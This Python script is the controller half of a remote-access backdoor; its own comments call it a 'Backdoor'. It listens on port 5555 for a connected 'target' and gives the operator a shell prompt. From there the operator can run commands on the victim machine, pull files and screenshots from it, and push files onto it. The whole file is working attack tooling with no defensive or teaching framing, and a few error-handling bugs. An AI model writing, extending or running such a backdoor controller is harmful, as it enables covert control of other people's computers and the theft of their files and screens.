import socket
import json
import os
import traceback

######## Configure Here #########
SERVER_IP = '192.168.1.1' # Server's IP

def reliable_send(command):
    json_data = json.dumps(command)
    target.send(json_data.encode()) # Encode and send the data

def reliable_recv():
    data = ''
    while True:
        try: # If json return a incomplete data a ValueError is raised and
             # the loop executes again append the rest of the packet
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
 
# Uploads file to client
def upload_file(file_name):
    try:
        file = open(file_name, 'rb') # Open file in "read bytes(rb)" mode
        target.send(file.read())
    except FileNotFoundError:
        print("File DNE: " + file_name)
        return
 
# Downlaods file from the client
def download_file(file_name):
    try:
        target.settimeout(1) # Set timeout to prevent crashing
        print("[+] Waiting for data ...")
        chunk = target.recv(1024) # Receive file contents
        print("[+] Data received!") 
        print("[+] Writing to file ...")
       
        if not chunk: # Check if file exists
            raise FileNotFoundError("No Data Received")

        file = open(file_name,'wb') # Open file in "write bytes (wb)" mode
        while chunk: # Executes as long as there is data in chunk var
            file.write(chunk)
            try:
                chunk = target.recv(1024) # Receive file contents
            except socket.timeout as e:
                break
    except socket.timeout and FileNotFoundError: # Catch File DNE error
        print("[!] File DNE: " + file_name)
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        target.settimeout(None) # Remove timeout
    print(f"[+] File: {file_name} Transfer Received")    
    file.close() # Close the file
                     
def target_communication():
    while True:
        try:
            command = input('[*] Shell~%s: ' % str(IP)) # Get command from user
            reliable_send(command) # Send the command to client
            if command == 'quit': # Close connection
                sock.close();
                break
            elif command == 'abort': # Backdoor aborted, close connection
                sock.close
                break
            elif command == 'clear': # Server side command
                os.system('clear')
            elif command[:3] == 'cd ': # Client side command
                pass
            elif command[:9] == 'download ': # Download command
                download_file(command[9:]) # Downloads file from client(download 'filename')
            elif command[:7] == 'upload ': # Upload command
                upload_file(command[7:]) # Uploads file to client
            elif command[:11] == 'screenshot ':
                download_file(command[11:]) # Downloads screenshot
            else:
                result = reliable_recv() # Receive response from target
                print(result)
        except Exception as e:
            print(f"[-] Error: {e}" )
            print(f"[-] Traceback: {traceback.print_exc()}")
            continue

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 and TCP
sock.bind((SERVER_IP, 5555)) # Bind socket to IP on port 5555

print("[*] Listening for connection ...")
sock.listen(5) # Listen for connection

target, IP = sock.accept() # Connect to target
print("[+] Target Connected, from: " + str(IP))

target_communication() # Begin communication
